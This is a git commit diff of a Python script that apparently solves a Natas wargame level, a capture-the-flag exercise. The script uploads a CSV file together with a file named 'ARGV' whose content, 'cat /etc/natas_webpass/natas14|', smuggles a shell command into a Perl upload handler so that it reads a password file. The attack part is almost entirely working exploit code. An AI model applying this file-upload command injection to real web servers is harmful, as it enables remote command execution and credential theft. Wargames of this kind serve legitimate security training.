f28140709445aec0eb9e61917666684629bb6e4f
Ludisposed <pjgvanschaik@gmail.com>
2017-12-22 18:42:01 +0100

    Update narnia31.py

--- Natas/Natas31env/narnia31.py
+++ Natas/Natas31env/narnia31.py
@@ -2,14 +2,14 @@ import requests
 session = requests.Session()
 
 def natas31(url):
-    with open('a.csv', 'w') as _file:
-        _file.write("a,b,c,d,e\n1,2,3,4\nasafe")
+    with open('a.csv', 'wb') as _file:
+        _file.write(b"a,b,c,d,e\n1,2,3,4\nasafe")
 
-    with open('ARGV', 'w') as _file:
-        _file.write("cat /etc/natas_webpass/natas14|") 
+    with open('ARGV', 'wb') as _file:
+        _file.write(b"cat /etc/natas_webpass/natas14|") 
     
     _files = [('upload_file', open('a.csv', 'rb')), ('upload_file', open('ARGV', 'rb'))]
-    response = session.post(url, files=_files)
+    response = session.post(url, files=_files, data={"submit": "Upload"})
     print(response.text)
 
 if __name__ == '__main__':
